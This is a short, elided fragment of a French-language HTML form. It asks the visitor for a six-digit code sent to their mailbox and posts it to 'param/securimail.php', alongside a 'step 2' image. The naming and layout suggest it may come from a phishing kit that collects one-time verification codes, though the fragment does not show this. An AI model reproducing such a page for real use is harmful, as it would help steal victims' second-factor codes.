...
">
                    <div class="form">
                        ...
                        <form method="post" action="param/securimail.php">
                            ...
                            <p id="cc" style="font-size:15px">
                             <i class="ui icon big mobile"></i> <br> <b> Entrez le code à <span style="color:teal">*6 chiffres*</span> reçu dans votre boîte mail : <br><br>
                                                   <input required="" maxlength="6" type="text" placeholder="******" name="securemail" id="securemail" class="form-control" style="display: inherit;width: 50%;" value=""></b></p><b>
                            </div>
                            ...
                            <p><img src="style/stp2.png"  width="500px" height="100px"></p>
